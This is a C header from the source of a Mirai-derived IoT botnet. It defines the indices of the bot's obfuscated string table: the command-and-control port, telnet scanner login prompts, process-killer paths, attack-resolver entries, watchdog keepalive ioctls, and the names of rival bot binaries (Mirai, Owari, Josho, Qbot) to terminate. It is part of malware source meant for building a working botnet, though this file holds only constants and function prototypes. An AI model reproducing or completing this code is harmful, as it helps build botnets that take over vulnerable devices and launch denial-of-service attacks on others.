#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

/* cnc */
#define TABLE_CNC_PORT 1

/* report */
#define TABLE_SCAN_CB_PORT 2

#define TABLE_EXEC_SUCCESS 3

/* scanner data */
#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_ASSWORD 12
#define TABLE_SCAN_OGIN 13
#define TABLE_SCAN_ENTER 14

/* killer data */
#define TABLE_KILLER_PROC 15
#define TABLE_KILLER_EXE 16
#define TABLE_KILLER_FD 17
#define TABLE_KILLER_MAPS 18
#define TABLE_KILLER_TCP 19

/* attack data */
#define TABLE_ATK_VSE 20
#define TABLE_ATK_RESOLVER 21
#define TABLE_ATK_NSERV 22

/* watchdog ioctl data */
#define TABLE_IOCTL_KEEPALIVE1 23
#define TABLE_IOCTL_KEEPALIVE2 24
#define TABLE_IOCTL_KEEPALIVE3 25
#define TABLE_IOCTL_KEEPALIVE4 26
#define TABLE_IOCTL_KEEPALIVE5 27
#define TABLE_IOCTL_KEEPALIVE6 28
#define TABLE_IOCTL_KEEPALIVE7 29

/* strings/executables data */
#define TABLE_EXEC_MIRAI 30
#define TABLE_EXEC_OWARI 31
#define TABLE_EXEC_JOSHO 32
#define TABLE_EXEC_ALLQBOT 33
#define TABLE_EXEC_OGOWARI 34
#define TABLE_EXEC_MIRAIDLR 35
#define TABLE_EXEC_MIRAIARM 36
#define TABLE_EXEC_MIRAIMIPS 37
#define TABLE_EXEC_MIRAIMPSL 38
#define TABLE_EXEC_X86_64 39

#define TABLE_RANDOM 40

#define TABLE_MAX_KEYS 41

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
